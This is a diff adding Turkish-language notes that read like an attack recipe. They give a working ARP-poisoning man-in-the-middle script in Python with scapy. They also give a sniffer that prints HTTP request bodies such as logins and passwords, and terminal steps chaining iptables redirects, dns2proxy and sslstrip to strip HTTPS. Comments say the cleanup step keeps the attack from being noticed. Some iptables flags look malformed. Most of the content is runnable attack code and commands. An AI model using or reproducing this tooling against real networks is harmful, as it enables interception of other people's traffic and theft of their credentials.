@@ -1,0 +1,160 @@
+*-)MITM olma ve paket dinleme kodları.
+Terminalde
+
+1-echo 1> /proc/sys/net/ipv4/ip_forward 	# ortadaki adam saldırısını kullanacağımız zaman terminalde ilk başta bunu yazmak lazım.(ip_forwardı etkin hale getirme yoksa bağlantısı kopar)
+2-python my_net_scanner.py -i 10.0.2.1/24    	#Wifidaki IP ve MACleri öğrenelim 
+3-pycharmı açalım:
+
+import scapy.all as scapy
+import time
+import optparse
+
+def get_mac_address(ip):
+    arp_request_packet = scapy.ARP(pdst=ip)
+    #scapy.ls(scapy.ARP())
+    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    #scapy.ls(scapy.Ether())
+    combined_packet = broadcast_packet/arp_request_packet
+    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
+
+    return answered_list[0][1].hwsrc 						#burada verilen IP ve MAC gösteriliyor
+
+def arp_poisoning(target_ip,poisoned_ip):
+
+    target_mac = get_mac_address(target_ip)
+
+    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
+    scapy.send(arp_response,verbose=False)
+    #scapy.ls(scapy.ARP())							#saldırılan pcye modem, modeme ise saldırılan pc gibi gösterim kodu
+
+def reset_operation(fooled_ip,gateway_ip):
+
+    fooled_mac = get_mac_address(fooled_ip)
+    gateway_mac = get_mac_address(gateway_ip)
+
+    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
+    scapy.send(arp_response,verbose=False,count=6)							# burada programı kapattığımızda restart çekiyor ve aradan çekiliyoruz.(Saldırımız anlaşılmasın diye)
+
+def get_user_input():
+    parse_object = optparse.OptionParser()
+
+    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
+    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
+
+    options = parse_object.parse_args()[0]
+
+    if not options.target_ip:
+        print("Enter Target IP")
+
+    if not options.gateway_ip:
+        print("Enter Gateway IP")
+
+    return options 				#Terminalde input istiyoruz burada 
+
+number = 0					#input fonksiyonunu çalıştırma
+
+user_ips = get_user_input()
+user_target_ip = user_ips.target_ip
+user_gateway_ip = user_ips.gateway_ip			#IP ve MAC değiştirme fonksiyonu
+
+try:
+    while True:
+
+        arp_poisoning(user_target_ip,user_gateway_ip)
+        arp_poisoning(user_gateway_ip,user_target_ip)
+
+        number += 2							
+
+        print("\rSending packets " + str(number),end="")
+
+        time.sleep(3)						#3 saniyede bir programı çalıştırıyoruz
+except KeyboardInterrupt:
+    print("\nQuit & Reset")
+    reset_operation(user_target_ip,user_gateway_ip)
+    reset_operation(user_gateway_ip,user_target_ip)		#çıkışta hata almamak için reset fonkisyon kodları ve eski haline alma kodları
+
+
+
+Terminalde:
+
+python3 my_arp_posion.py -t 10.0.2.8 -g 10.0.2.1   			#-t: saldırı yapılan pc  , -g: modem 
+
+
+/---------------------------------------------------------------*******************--------------------------------------------------------------------------------/
+
+
+#PaketDinleyici ,mıtm yaptık sırada paketleri verileri çekmek.
+
+#wiresharktada eth0 bastığımızda veriler gelecek. Ama http sitelerdeki kullanıcı adı ve parolalar gelecek. Http basıp protocole bastığımızda postların içinde olacak nickname ve password
+
+Terminalde 
+
+pip install scapy_http
+pip3 install scapy_http #şimdi pycharmda kod yazalım.
+
+PYCHARM:
+
+import scapy.all as scapy
+from scapy_http import http
+
+def listen_packets(interface):
+
+    scapy.sniff(iface=interface,store=False,prn=analyze_packets)
+    #prn = callback function
+
+def analyze_packets(packet):
+    #packet.show()
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load)
+
+listen_packets("eth0")
+
+
+#Terminalde önce MITM çalıştırıp daha sonra bunu çalıştırırsak veriler gelecektir.
+
+/--------------------------------------------------------------******************-------------------------------------------------------------------/
+
+HTTPS ile Çalışmak 
+4 Terminalle çalışacağız. sırasıyla olacak.
+
+
+1.Terminalde:
+
+iptables -t nat -A PREROUTING -p --destination -port 80 -j REDIRECT --to-port 10000
+iptables -t  nat -A PREROUTING -p udp --destination -port 53 -j REDIRECT --to-port 53
+clear
+
+cd opt
+mkdir dnstest
+cd dnstest/
+ls
+git clone https://github.com/single/dns2proxy
+cd dns2proxy/
+ls
+
+python dns2proxy.py
+
+
+2.Terminalde
+
+sslstrip
+
+3.Terminalde
+
+cd PycharmProjects/
+ls
+cd MyPocketListener/
+ls
+python3 my_pocket_listener.py
+
+
+4.Terminale
+
+cd PycharmProjects/
+ls
+cd MITM/
+ls
+python3 my_arp_posion.py -t 10.0.2.8 -g 10.0.2.1
+
+
